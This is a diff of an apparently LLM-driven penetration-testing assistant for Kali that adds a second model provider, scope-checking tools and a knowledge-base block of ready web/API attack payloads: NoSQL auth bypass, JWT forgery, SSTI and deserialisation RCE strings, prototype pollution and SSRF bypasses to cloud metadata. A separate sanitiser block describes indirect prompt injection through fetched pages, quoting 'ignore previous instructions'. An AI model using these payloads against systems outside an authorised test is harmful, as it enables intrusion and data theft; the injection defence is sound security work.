@@ -27,10 +27,9 @@ import inspect
 import datetime
 import subprocess
 import ipaddress
-import shutil
 from dataclasses import dataclass, field, asdict
 from pathlib import Path
-from typing import Optional, List, Dict, Any, Tuple, Set
+from typing import Optional, List, Dict, Any, Tuple
 
 # v7.4 — make the athena_ext package importable no matter how we're launched.
 # The CLI is symlinked into /usr/local/bin, so the interpreter's default
@@ -61,25 +60,42 @@ except ImportError:
 
 
 # ═════════════════════════════════════════════════════════════════════
-# VERSION & PROVIDER CHAIN  (Groq only, biggest→smallest)
+# VERSION & PROVIDER CHAIN  (Groq + optional SiliconFlow, biggest→smallest)
 # ═════════════════════════════════════════════════════════════════════
 
-VERSION = "7.4"
+VERSION = "7.7"
 
 # v7.3 — CHEAP-FIRST chain, verified Groq models only.
 # openai/gpt-oss-* and allam-2-7b were 404-ing constantly and burning
 # retries.  groq/compound paths renamed to their correct API names.
 # Added gemma2-9b-it and deepseek-r1-distill-llama-70b as solid fallbacks.
+#
+# v7.6 — SECOND PROVIDER: SiliconFlow (OpenAI-compatible, same as Basilisk's
+# default). Each entry now carries which provider it belongs to. SiliconFlow
+# entries are only used if SILICONFLOW_API_KEY is set; otherwise they're skipped
+# at runtime so a Groq-only install behaves exactly as before. SiliconFlow hosts
+# large open models (Kimi, GLM, Qwen, DeepSeek) that Groq doesn't, and gives a
+# fallback when the free Groq tier is rate-limited.
+#   entry = (model_id, display_name, provider)  provider ∈ {"groq","siliconflow"}
 PROVIDER_CHAIN = [
-    ("llama-3.1-8b-instant",                          "LLaMA 3.1 8B"),
-    ("gemma2-9b-it",                                   "Gemma 2 9B"),
-    ("meta-llama/llama-4-scout-17b-16e-instruct",     "LLaMA 4 Scout 17B"),
-    ("qwen/qwen3-32b",                                 "Qwen3 32B"),
-    ("llama-3.3-70b-versatile",                        "LLaMA 3.3 70B"),
-    ("deepseek-r1-distill-llama-70b",                  "DeepSeek R1 70B"),
-    ("compound-beta-mini",                             "Compound Beta Mini"),
-    ("compound-beta",                                  "Compound Beta"),
+    ("llama-3.1-8b-instant",                          "LLaMA 3.1 8B",       "groq"),
+    ("gemma2-9b-it",                                   "Gemma 2 9B",         "groq"),
+    ("meta-llama/llama-4-scout-17b-16e-instruct",     "LLaMA 4 Scout 17B",  "groq"),
+    ("qwen/qwen3-32b",                                 "Qwen3 32B",          "groq"),
+    ("llama-3.3-70b-versatile",                        "LLaMA 3.3 70B",      "groq"),
+    ("deepseek-r1-distill-llama-70b",                  "DeepSeek R1 70B",    "groq"),
+    ("compound-beta-mini",                             "Compound Beta Mini", "groq"),
+    ("compound-beta",                                  "Compound Beta",      "groq"),
+    # ── SiliconFlow (used only when SILICONFLOW_API_KEY is set) ──
+    ("Qwen/Qwen3-32B",                                 "Qwen3 32B (SF)",     "siliconflow"),
+    ("deepseek-ai/DeepSeek-V3",                        "DeepSeek V3 (SF)",   "siliconflow"),
+    ("moonshotai/Kimi-K2-Instruct",                    "Kimi K2 (SF)",       "siliconflow"),
+    ("zai-org/GLM-4.5",                                "GLM 4.5 (SF)",       "siliconflow"),
+    ("Qwen/Qwen2.5-72B-Instruct",                      "Qwen2.5 72B (SF)",   "siliconflow"),
 ]
+
+# OpenAI-compatible API root for SiliconFlow (no trailing slash beyond /v1).
+SILICONFLOW_BASE_URL = "https://api.siliconflow.com/v1"
 
 
 # ═════════════════════════════════════════════════════════════════════
@@ -119,7 +135,8 @@ def ext_status() -> Dict[str, str]:
     """Report which smart modules loaded, for the `tools`/dashboard views."""
     out = {}
     for n in ("memory", "oracle", "zdayfind", "codescan",
-              "headroom", "foresight", "sandbox"):
+              "headroom", "foresight", "sandbox", "webshield",
+              "engage", "recall", "unblock"):
         if n in _EXT_CACHE:
             out[n] = "loaded"
         elif n in _EXT_FAILED:
@@ -1074,12 +1091,73 @@ sherlock USERNAME (social media enum)
 holehe EMAIL (account enum)"""
 
 
+# v7.7 — DEEP WEB/API ARSENAL. Distilled from Basilisk's exploit builders (the
+# knowledge that scores 87/113 on Juice Shop), rewritten as copilot guidance:
+# Athena PROPOSES these payloads, you still approve every command. This is the
+# advanced web/API layer KB[3] only gestured at — NoSQL, modern JWT, SSTI-by-
+# engine, deserialisation-by-platform, prototype pollution, GraphQL, SSRF
+# bypasses, request smuggling, IDOR/mass-assignment, business logic.
+KB[17] = r"""
+S17 DEEP WEB/API EXPLOITATION (propose the precise payload, not just the tool):
+NoSQL (MongoDB/JSON APIs):
+  Auth bypass (JSON body): {"email":{"$ne":null},"password":{"$ne":null}}
+  Also: {"$gt":""} , operator in query string: user[$ne]=x&pass[$ne]=x
+  Blind exfil (boolean oracle): {"email":{"$regex":"^A"}} — walk charset by
+    response diff to extract a field char-by-char.
+  DoS/where-eval: {"$where":"sleep(5000)"} — confirms server-side JS eval.
+JWT (decode header+payload first: cut -d. -f1,2 | base64 -d):
+  alg:none — set header {"alg":"none"}, drop the signature, keep the dot:
+    <b64url header>.<b64url payload>.   (trailing dot, empty sig)
+  RS256->HS256 confusion — if server verifies RS256 with the PUBLIC key, re-sign
+    HS256 using that public key as the HMAC secret (forges any claim).
+  kid injection — kid path traversal to a known file, or SQLi in kid.
+  Weak secret — hashcat -m 16500 token.jwt wordlist.
+SSTI (confirm with {{7*7}}/${7*7}/#{7*7} -> 49, then engine-specific RCE):
+  Jinja2: {{cycler.__init__.__globals__.os.popen('id').read()}}
+  Twig:   {{['id']|filter('system')}}
+  Freemarker: <#assign x="freemarker.template.utility.Execute"?new()>${x("id")}
+  Velocity: #set($e="e");$e.getClass().forName("java.lang.Runtime")...exec("id")
+Deserialisation RCE (pick by platform):
+  Node (node-serialize): {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
+  Python pickle: object with __reduce__ -> (os.system,("id",)); base64 it.
+  Java: ysoserial CommonsCollections<N> 'id' | base64 -w0
+  PHP: phpggc <chain> system id ; or hand-craft O:strlen:"Class":...
+  .NET: ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "id"
+  Ruby: Marshal gadget (universal RCE chain).
+Prototype pollution (JSON the server merges/clones):
+  {"__proto__":{"isAdmin":true}}  — if stripped: {"constructor":{"prototype":{"isAdmin":true}}}
+  Then a FRESH object elsewhere inherits isAdmin. Chain to RCE via gadget
+    (e.g. child_process options pollution).
+GraphQL:
+  Introspection: {"query":"{__schema{types{name fields{name}}}}"} (if enabled).
+  Batching/alias abuse to brute or bypass rate limits; look for IDOR in node(id:).
+SSRF bypasses (past filters/allowlists):
+  Cloud metadata: http://169.254.169.254/latest/meta-data/ (AWS IMDSv1),
+    http://metadata.google.internal/... (needs Metadata-Flavor: Google).
+  Bypass: decimal IP (http://2130706433/), [::]/[::1], http://127.0.0.1.nip.io,
+    http://localhost#@evil, DNS rebinding, gopher:// for internal protocols.
+Request smuggling (HTTP desync): craft CL.TE / TE.CL with conflicting
+  Content-Length + Transfer-Encoding: chunked to poison the next request.
+IDOR / BOLA: increment/replace ids (numeric, UUID, base64), swap your token
+  onto another user's object id; check every /api/<obj>/<id> for missing authz.
+Mass assignment / BFLA: add fields the UI never sends — {"role":"admin",
+  "isAdmin":true,"verified":true} — to create/update calls; hit admin-only
+  endpoints with a normal token.
+Business logic: negative quantities/prices, coupon stacking, race the checkout
+  (parallel requests before a balance updates), skip a step in a multi-stage flow.
+File upload: double-ext (.php.jpg), null byte (.php%00.jpg), .phtml/.php5/.phar,
+  magic-byte prefix + polyglot, Content-Type spoof, case (.pHp), path in filename.
+Discipline: confirm each bug with real evidence (a dumped row, a reflected 49, a
+  forged token that validates, an OOB callback) before you call it proven — arm
+  the oracle first. Everything here still runs through the y/n gate."""
+
+
 WORKFLOW_KB_MAP = {
     "1":  [2, 8, 14],          # Network Recon
-    "2":  [3, 8, 14],          # Web Enum
+    "2":  [3, 17, 8, 14],      # Web Enum
     "3":  [5, 7, 10, 14],      # Linux Post-Exploit
     "4":  [11, 12],            # Metasploit
-    "5":  [3, 10, 14],         # SQL Injection
+    "5":  [3, 17, 10, 14],     # SQL Injection
     "6":  [10],                # Hash Cracking
     "7":  [10, 13],            # Password Spraying
     "8":  [4, 10, 9],          # AD Recon
@@ -1089,7 +1167,7 @@ WORKFLOW_KB_MAP = {
     "12": [15, 2, 8],          # SSL/TLS Audit
     "13": [16, 2, 13],         # DNS Enum
     "14": [4, 10, 13],         # SMB Attack
-    "15": [3, 14],             # API Security
+    "15": [3, 17, 14],         # API Security
     "16": [5, 7, 14],          # Linux Privesc
     "17": [6, 7, 10],          # Windows Privesc
     "18": [4, 7, 9],           # Lateral Movement
@@ -1101,7 +1179,9 @@ WORKFLOW_KB_MAP = {
 }
 
 KEYWORD_KB_MAP = {
-    "web|http|https|sql|xss|lfi|rfi|ssrf|api|jwt|oauth|cookie|upload": [3, 14],
+    "web|http|https|sql|xss|lfi|rfi|ssrf|api|jwt|oauth|cookie|upload|"
+    "nosql|mongo|ssti|template|deserial|pickle|ysoserial|graphql|idor|bola|"
+    "prototype|pollution|smuggling|xxe|mass.assign|business.logic|juice": [3, 17, 14],
     "smb|windows|active.directory|domain|kerberos|ntlm|ldap|dc\\b|\\bad\\b": [4, 10],
     "linux|sudo|suid|cron|privilege|root|privesc|escalat": [5, 7, 14],
     "windows|system|service|token|potato|uac|dll": [6, 7, 10],
@@ -1131,7 +1211,7 @@ def get_kb_sections(workflow_key: Optional[str] = None,
     # (removed KB 14 from most roles; it's generic and repeats other guidance)
     role_map = {
         "recon":           [2, 8, 13],
-        "web":             [3, 8, 15],
+        "web":             [3, 17, 15],
         "network":         [2, 8, 13],
         "ad":              [4, 10],
         "linux_privesc":   [5, 7],
@@ -1156,10 +1236,15 @@ def get_kb_sections(workflow_key: Optional[str] = None,
         section_nums.update([2])  # v7.3: was [2, 14] — 14 is generic
 
     # v7.3 — hard cap: never send more than 4 sections (1 always + 3 role/kw)
-    # KB 1 stays. Trim the extras to the lowest-numbered (most fundamental)
+    # KB 1 stays. Trim the extras to the lowest-numbered (most fundamental).
+    # v7.7 — but KB 17 (the deep web/API arsenal) is the whole point of a web
+    # engagement and is the HIGHEST-numbered, so a naive "keep lowest 4" would
+    # drop it exactly when it matters. Pin it if it was selected, then fill the
+    # rest with the lowest-numbered sections.
     if len(section_nums) > 4:
-        sorted_nums = sorted(section_nums)
-        section_nums = set(sorted_nums[:4])
+        pinned = {n for n in (1, 17) if n in section_nums}
+        rest = sorted(section_nums - pinned)
+        section_nums = pinned | set(rest[:4 - len(pinned)])
 
     parts = []
     for num in sorted(section_nums):
@@ -1963,15 +2048,15 @@ def analyze_and_suggest_exploit(cve: str, target: str, lhost: str) -> str:
             out += f"\n\033[33m[OPTION {i}] {s['title']}\033[0m\n"
             if s['type'] == 'msf':
                 out += "\033[90mType: Metasploit Module\033[0m\n"
-                out += f"\033[97mSuggested:\033[0m\n"
+                out += "\033[97mSuggested:\033[0m\n"
                 out += f"  echo 'use {s['module']}' > /tmp/exploit.rc\n"
                 out += f"  echo 'set RHOSTS {target}' >> /tmp/exploit.rc\n"
                 out += f"  echo 'set LHOST {lhost}' >> /tmp/exploit.rc\n"
-                out += f"  echo 'run' >> /tmp/exploit.rc\n"
-                out += f"  echo 'exit' >> /tmp/exploit.rc\n"
-                out += f"  msfconsole -q -r /tmp/exploit.rc\n"
+                out += "  echo 'run' >> /tmp/exploit.rc\n"
+                out += "  echo 'exit' >> /tmp/exploit.rc\n"
+                out += "  msfconsole -q -r /tmp/exploit.rc\n"
             else:
-                out += f"\033[90mType: Standalone Exploit\033[0m\n"
+                out += "\033[90mType: Standalone Exploit\033[0m\n"
                 out += f"\033[97mPath:\033[0m {s['path']}\n"
                 out += f"\033[97mInspect:\033[0m cat {s['path']}\n"
         out += f"\n\033[31m{'='*60}\033[0m\n"
@@ -2052,7 +2137,49 @@ def compress_output_for_history(output: str,
     return result or "(no useful output)"
 
 
-# ─── Visual helpers ───────────────────────────────────────────────────
+# ─── v7.5 — untrusted-web sanitiser (Basilisk's webshield, leash-on) ──
+# Athena runs commands that pull attacker-controlled web content — curl of a
+# remote page, crt.sh JSON, a fetched response body — and that text is fed back
+# into the model's context. Hidden text in such a page can carry an INDIRECT
+# PROMPT INJECTION ("ignore previous instructions", "run the following", fake
+# system/role tags). The model can't reliably tell data from instructions in a
+# blob it's told to analyse, so webshield strips executable markup, redacts
+# known injection patterns deterministically, and wraps the rest in explicit
+# UNTRUSTED markers — BEFORE it reaches the model. Fail-soft: if the ext is
+# missing the content passes through unchanged (same contract as every other
+# athena_ext module). This is a defensive port; it changes nothing about the
+# y/n gate or Athena's copilot design.
+
+def sanitize_web_output(text: str, source: str = "") -> str:
+    """Scrub untrusted web-fetched text through webshield before it reaches the
+    model. Returns the isolation-wrapped, injection-redacted text, or the
+    original text unchanged if webshield isn't available."""
+    if not text:
+        return text
+    ws = _ext("webshield")
+    if ws is None:
+        return text
+    try:
+        res = ws.sanitize(text, source=source, kind="web")
+        cleaned = res.get("text") or res.get("sanitized") or text
+        return cleaned
+    except Exception:
+        return text
+
+
+# A conservative signal for "this command fetched web content" — used to decide
+# whether to route output through the sanitiser. Deliberately narrow: only the
+# commands that actually pull remote page bodies, not every tool.
+_WEB_FETCH_RE = re.compile(
+    r"\b(curl|wget|http|https|httpie|GET|POST)\b.*https?://|"
+    r"\bcrt\.sh\b|\bwhatweb\b|\bwafw00f\b|\bgobuster\b.*-u\s+https?://",
+    re.IGNORECASE)
+
+
+def command_fetches_web(cmd: str) -> bool:
+    """True if the command pulls attacker-controllable web content whose output
+    should be run through webshield before the model sees it."""
+    return bool(cmd and _WEB_FETCH_RE.search(cmd))
 
 def hr(width: int = 64, char: str = "─", color: str = "90") -> str:
     return f"\033[{color}m{char * width}\033[0m"
@@ -3222,6 +3349,43 @@ def _pt_oob_hits(session, a):
     return json.dumps(o.oob_hits(a.get("token", "")), indent=2)[:MAX_OUTPUT_CHARS]
 
 
+def _pt_scope_check(session, a):
+    e = _ext("engage")
+    if e is None:
+        return "engage module unavailable."
+    r = e.scope_check(a.get("target", ""), engagement=a.get("engagement", "default"))
+    return json.dumps(r, indent=2)[:MAX_OUTPUT_CHARS]
+
+
+def _pt_scope_show(session, a):
+    e = _ext("engage")
+    if e is None:
+        return "engage module unavailable."
+    r = e.scope_show(engagement=a.get("engagement", "default"))
+    return json.dumps(r, indent=2)[:MAX_OUTPUT_CHARS]
+
+
+def _pt_asset_record(session, a):
+    e = _ext("engage")
+    if e is None:
+        return "engage module unavailable."
+    r = e.asset_record(
+        engagement=a.get("engagement", "default"), host=a.get("host", ""),
+        port=a.get("port"), service=a.get("service", ""),
+        finding=a.get("finding", ""), access=a.get("access", ""),
+        note=a.get("note", ""))
+    return json.dumps(r, indent=2)[:MAX_OUTPUT_CHARS]
+
+
+def _pt_graph_query(session, a):
+    e = _ext("engage")
+    if e is None:
+        return "engage module unavailable."
+    r = e.graph_query(engagement=a.get("engagement", "default"),
+                      host=a.get("host", ""))
+    return json.dumps(r, indent=2)[:MAX_OUTPUT_CHARS]
+
+
 PURE_TOOL_DISPATCH = {
     "zday_scan":         _pt_zday_scan,
     "zday_signatures":   _pt_zday_signatures,
@@ -3235,6 +3399,10 @@ PURE_TOOL_DISPATCH = {
     "oracle_status":     _pt_oracle_status,
     "oob_start":         _pt_oob_start,
     "oob_hits":          _pt_oob_hits,
+    "scope_check":       _pt_scope_check,
+    "scope_show":        _pt_scope_show,
+    "asset_record":      _pt_asset_record,
+    "graph_query":       _pt_graph_query,
 }
 
 # Compact spec shown to the model (gated to turns 1-2 like the shell registry).
@@ -3261,6 +3429,13 @@ PURE_TOOL_SPEC = (
     "failed/inconclusive. A finding is VERIFIED only once the oracle confirms.\n"
     "  oracle_status — armed/confirmed ledger; oob_start — start the out-of-"
     "band canary listener; oob_hits[ARGS]{\"token\":\"...\"}[/ARGS] — callbacks.\n"
+    "  scope_check[ARGS]{\"target\":\"...\"}[/ARGS] — is a host/CIDR/domain in the "
+    "authorised scope? FAILS CLOSED (unknown => not in scope). Consult before "
+    "proposing any active command. scope_show — the current scope + "
+    "authorisation. asset_record[ARGS]{\"host\":\"...\",\"service\":\"...\",\"port\":"
+    "N,\"finding\":\"...\",\"access\":\"...\"}[/ARGS] — record what you've learned "
+    "about a host into the engagement asset graph. graph_query[ARGS]{\"host\":"
+    "\"...\"}[/ARGS] — read the asset graph back to reason over the whole job.\n"
     "Discipline: arm -> exploit -> check. Don't claim success the oracle "
     "hasn't confirmed."
 )
@@ -4362,7 +4537,7 @@ def build_system_prompt(agent_role: str,
     mentor_block = MENTOR_PERSONA
 
     parts = [
-        f"You are Athena, an elite offensive AI assistant on Kali NetHunter.",
+        "You are Athena, an elite offensive AI assistant on Kali NetHunter.",
         f"Operator: The Priest.  Your LHOST: {lhost}",
         "",
         mentor_block,
@@ -4577,8 +4752,29 @@ class AthenaSession:
         except Exception as e:
             print(f"\033[31m   FATAL: Groq init: {e}\033[0m")
             sys.exit(1)
+        print("\033[32m   ✅ Groq client OK\033[0m")
+
+        # v7.6 — optional SiliconFlow client (OpenAI-compatible). The Groq SDK
+        # is OpenAI-compatible and accepts a base_url, so we reuse it pointed at
+        # SiliconFlow rather than adding an `openai` dependency. Absent key →
+        # the client stays None and SiliconFlow models are skipped in the chain.
+        self.siliconflow_client = None
+        sf_key = os.environ.get("SILICONFLOW_API_KEY")
+        if sf_key:
+            try:
+                self.siliconflow_client = Groq(
+                    api_key=sf_key, base_url=SILICONFLOW_BASE_URL)
+                print("\033[32m   ✅ SiliconFlow client OK "
+                      "(Kimi · GLM · Qwen · DeepSeek)\033[0m")
+            except Exception as e:
+                print(f"\033[33m   SiliconFlow init failed ({str(e)[:50]}) — "
+                      "Groq only\033[0m")
+                self.siliconflow_client = None
+        else:
+            print("\033[90m   (set SILICONFLOW_API_KEY to add SiliconFlow "
+                  "models to the fallback chain)\033[0m")
+
         first = PROVIDER_CHAIN[0]
-        print(f"\033[32m   ✅ Groq client OK\033[0m")
         print(f"\033[32m   Active model: {first[1]}\033[0m")
 
     # ── Logging ───────────────────────────────────────────────────
@@ -4668,8 +4864,14 @@ class AthenaSession:
     # ── Provider call & fallback chain ────────────────────────────
 
     def _call_provider(self, messages: list, model: str,
+                       provider: str = "groq",
                        max_tokens: int = MAX_TOKENS_DEFAULT) -> str:
-        completion = self.groq_client.chat.completions.create(
+        client = self.groq_client
+        if provider == "siliconflow":
+            if self.siliconflow_client is None:
+                raise RuntimeError("siliconflow_unavailable")
+            client = self.siliconflow_client
+        completion = client.chat.completions.create(
             model=model,
             messages=messages,
             temperature=0.2,
@@ -4684,10 +4886,16 @@ class AthenaSession:
 
         for attempt in range(len(PROVIDER_CHAIN)):
             idx = (start_index + attempt) % len(PROVIDER_CHAIN)
-            model_id, model_name = PROVIDER_CHAIN[idx]
+            model_id, model_name, provider = PROVIDER_CHAIN[idx]
+
+            # v7.6 — skip SiliconFlow entries when no SiliconFlow key is set,
+            # so a Groq-only install never wastes a fallback hop on them.
+            if provider == "siliconflow" and self.siliconflow_client is None:
+                continue
 
             try:
-                response = self._call_provider(messages, model_id, max_tokens)
+                response = self._call_provider(
+                    messages, model_id, provider, max_tokens)
                 if idx != self.provider_index:
                     self.provider_index = idx
                     print(f"\n\033[33m   ↪ Switched to: {model_name}\033[0m")
@@ -4999,7 +5207,7 @@ class AthenaSession:
             print(error_alert(
                 "OUT OF SCOPE — REFUSED",
                 f"{cmd}\n\nReason: {scope_reason}",
-                hint=f"Edit ~/.athena/scope.json to adjust engagement scope."))
+                hint="Edit ~/.athena/scope.json to adjust engagement scope."))
             self._log(f"[OUT-OF-SCOPE] {cmd} -- {scope_reason}")
             return EXEC_REJECTED
 
@@ -5081,7 +5289,7 @@ class AthenaSession:
 
         # Double-confirm for system-modifying commands
         if self._needs_double_confirm(cmd):
-            print(f"\n\033[33m   ⚠  This modifies system state. Confirm again.\033[0m")
+            print("\n\033[33m   ⚠  This modifies system state. Confirm again.\033[0m")
             try:
                 second = input("\033[33m   Really execute? [y/n]: \033[0m")
             except (EOFError, KeyboardInterrupt):
@@ -5281,6 +5489,16 @@ class AthenaSession:
                     print(f"\033[33m   ↳ Credential queued for fanout testing: "
                           f"{f.value[:40]}\033[0m")
 
+        # v7.5 — if this command pulled attacker-controlled web content, scrub
+        # it through webshield (indirect-prompt-injection firewall) BEFORE it
+        # enters the model's context. Fail-soft: no-op if the ext is absent.
+        if command_fetches_web(cmd):
+            scrubbed = sanitize_web_output(raw_output, source=cmd[:80])
+            if scrubbed is not raw_output and scrubbed != raw_output:
+                print("\033[90m   [web content sanitised through webshield "
+                      "before AI context]\033[0m")
+                raw_output = scrubbed
+
         # Compress for AI context
         compressed = compress_output_for_history(
             raw_output, is_exploit_result=is_exploit
@@ -5307,7 +5525,7 @@ class AthenaSession:
         print(_box(
             "PoC VERIFICATION",
             [f"  Claim: \033[97m{finding_type}={finding_value[:48]}\033[0m",
-             f"  Verifier will attempt to confirm this is real."],
+             "  Verifier will attempt to confirm this is real."],
             color="31"))
 
         result = self.run_command(verify_cmd, label="VERIFY")
@@ -5715,7 +5933,7 @@ class AthenaSession:
         m = re.search(r'\[OPTIONS\](.*?)\[/?OPTIONS\]', response, re.DOTALL)
         opts_text = m.group(1).strip() if m else response
 
-        print(f"\n\033[35m   ATHENA — 3 ALTERNATIVES:\033[0m\n")
+        print("\n\033[35m   ATHENA — 3 ALTERNATIVES:\033[0m\n")
         print(f"\033[97m{opts_text}\033[0m\n")
 
         try:
@@ -5911,8 +6129,8 @@ class AthenaSession:
                 print()
                 print(error_alert(
                     "LOOP DETECTED",
-                    f"You just ran this exact command. Repeating means the "
-                    f"previous result didn't change anything you can act on.",
+                    "You just ran this exact command. Repeating means the "
+                    "previous result didn't change anything you can act on.",
                     hint="Forcing pivot to a different approach now."))
                 self.stuck_counter += 1
                 if active:
@@ -6106,7 +6324,7 @@ class AthenaSession:
         for k, wf in WORKFLOWS.items():
             print(f"   \033[97m[{k:>2}]\033[0m  {wf['name']}")
             print(f"          \033[90m{wf['description']}\033[0m")
-        print(f"\n   \033[97m[ 0]\033[0m  Cancel\n")
+        print("\n   \033[97m[ 0]\033[0m  Cancel\n")
         try:
             choice = input("\033[90m   Select: \033[0m").strip()
         except (EOFError, KeyboardInterrupt):
@@ -6141,10 +6359,10 @@ class AthenaSession:
         print(f"\n{header_box('  PENTESTING TASK TREE  ', color='35')}\n")
         print(self.ptt.to_terminal())
         print()
-        print(f"  \033[90mLegend:\033[0m  "
-              f"○ todo  \033[33m◐\033[0m in_progress  "
-              f"\033[32m●\033[0m done  \033[31m✗\033[0m dead-end  "
-              f"\033[90m─\033[0m skipped")
+        print("  \033[90mLegend:\033[0m  "
+              "○ todo  \033[33m◐\033[0m in_progress  "
+              "\033[32m●\033[0m done  \033[31m✗\033[0m dead-end  "
+              "\033[90m─\033[0m skipped")
         print()
 
     # ── Report generation (with cleanup pass) ───────────────────
@@ -6249,24 +6467,24 @@ class AthenaSession:
                 f.write(f"# ATHENA v{VERSION} REPORT\n\n")
                 f.write(f"- **Target:** {target or 'Not set'}\n")
                 f.write(f"- **Mission:** {self.target_info.get('notes') or '—'}\n")
-                f.write(f"- **Operator:** The Priest\n")
+                f.write("- **Operator:** The Priest\n")
                 f.write(f"- **Started:** {self.session_start.isoformat(timespec='seconds')}\n")
                 f.write(f"- **Duration:** {str(duration).split('.')[0]}\n")
                 f.write(f"- **LHOST:** {self.lhost}\n")
                 f.write(f"- **Scope enforced:** {'yes' if self.scope.enabled else 'no'}\n")
                 f.write(savings_line)
-                f.write(f"\n---\n\n")
+                f.write("\n---\n\n")
                 f.write(body)
-                f.write(f"\n\n---\n\n")
+                f.write("\n\n---\n\n")
                 f.write(mitre_section)
-                f.write(f"\n\n---\n\n")
-                f.write(f"## Pentesting Task Tree (Final State)\n\n```\n")
+                f.write("\n\n---\n\n")
+                f.write("## Pentesting Task Tree (Final State)\n\n```\n")
                 f.write(self.ptt.to_natural_language(max_chars=8000))
-                f.write(f"\n```\n\n")
-                f.write(f"## Attack Graph Summary\n\n```\n")
+                f.write("\n```\n\n")
+                f.write("## Attack Graph Summary\n\n```\n")
                 f.write(self.graph.to_compact_text(max_chars=4000))
-                f.write(f"\n```\n\n")
-                f.write(f"## Raw Findings (with provenance + ATT&CK)\n\n")
+                f.write("\n```\n\n")
+                f.write("## Raw Findings (with provenance + ATT&CK)\n\n")
                 for fnd in self.ptt.findings:
                     mark = "✓" if fnd.verified else "?"
                     attack = (f" `{fnd.attack_id} {fnd.attack_name}`"
@@ -6337,17 +6555,26 @@ class AthenaSession:
 
     def show_model_status(self):
         print(f"\n{header_box('  PROVIDER CHAIN  ', color='35')}\n")
-        for i, (model_id, name) in enumerate(PROVIDER_CHAIN):
+        for i, (model_id, name, provider) in enumerate(PROVIDER_CHAIN):
             mark = "\033[32m▶ ACTIVE\033[0m" if i == self.provider_index else "      "
-            print(f"   {mark}  [{i+1}]  \033[97m{name:<22}\033[0m  "
-                  f"\033[90m{model_id}\033[0m")
+            # grey out SiliconFlow rows when no SiliconFlow key is configured
+            unavailable = (provider == "siliconflow"
+                           and getattr(self, "siliconflow_client", None) is None)
+            tag = "" if provider == "groq" else (
+                " \033[90m(no SF key)\033[0m" if unavailable
+                else " \033[36m(SiliconFlow)\033[0m")
+            name_col = f"\033[90m{name:<22}\033[0m" if unavailable \
+                else f"\033[97m{name:<22}\033[0m"
+            print(f"   {mark}  [{i+1}]  {name_col}  "
+                  f"\033[90m{model_id}\033[0m{tag}")
         print()
 
     def show_tools_status(self):
         print(f"\n{header_box('  KALI ARSENAL — AVAILABILITY  ', color='35')}\n")
         # v7.4 — smart subsystem status up top.
         for n in ("memory", "oracle", "zdayfind", "codescan",
-                  "headroom", "foresight", "sandbox"):
+                  "headroom", "foresight", "sandbox", "webshield",
+              "engage", "recall", "unblock"):
             _ext(n)
         smart = ext_status()
         loaded = [k for k, v in smart.items() if v == "loaded"]
@@ -6394,7 +6621,7 @@ class AthenaSession:
         print(f"\n{header_box('  ENGAGEMENT SCOPE / RoE  ', color='33')}\n")
         print(f"   {self.scope.summary()}")
         print(f"\n   \033[90mFile: {SCOPE_FILE}\033[0m")
-        print(f"   \033[90mEdit that file to set CIDRs, domains, time windows.\033[0m\n")
+        print("   \033[90mEdit that file to set CIDRs, domains, time windows.\033[0m\n")
         try:
             choice = input("   Toggle scope enabled? [y/N]: ").strip().lower()
         except (EOFError, KeyboardInterrupt):
@@ -6431,7 +6658,7 @@ class AthenaSession:
         print()
         sugg = self.graph.pivot_suggestions()
         if sugg:
-            print(f"   \033[33m\033[1mPIVOT HINTS:\033[0m")
+            print("   \033[33m\033[1mPIVOT HINTS:\033[0m")
             for s in sugg:
                 print(f"     \033[33m›\033[0m {s}")
         print()
@@ -6501,7 +6728,7 @@ class AthenaSession:
             f"   Scope RoE  : \033[97m{'enabled' if self.scope.enabled else 'disabled'}\033[0m\n"
             f"   Graph      : \033[97m{'on' if HAS_NETWORKX else 'off (pip install networkx)'}\033[0m\n"
             f"   Smart ext  : \033[97m{sum(1 for v in ext_status().values() if v=='loaded')}\033[0m/7 loaded "
-            f"\033[90m(memory·oracle·zday·codescan·headroom·foresight·sandbox)\033[0m\n\n"
+            f"\033[90m(memory·oracle·zday·codescan·headroom·foresight·sandbox·webshield)\033[0m\n\n"
             "   \033[97mworkflow\033[0m  open the workflow menu\n"
             "   \033[97mtarget\033[0m    set or update target\n"
             "   \033[97mfindings\033[0m  show extracted findings (verified + unverified)\n"
@@ -6539,7 +6766,8 @@ class AthenaSession:
         """`ext` — show which ported smart modules loaded."""
         # Touch each so status reflects reality, not lazy-load state.
         for n in ("memory", "oracle", "zdayfind", "codescan",
-                  "headroom", "foresight", "sandbox"):
+                  "headroom", "foresight", "sandbox", "webshield",
+              "engage", "recall", "unblock"):
             _ext(n)
         lines = []
         for name, state in ext_status().items():
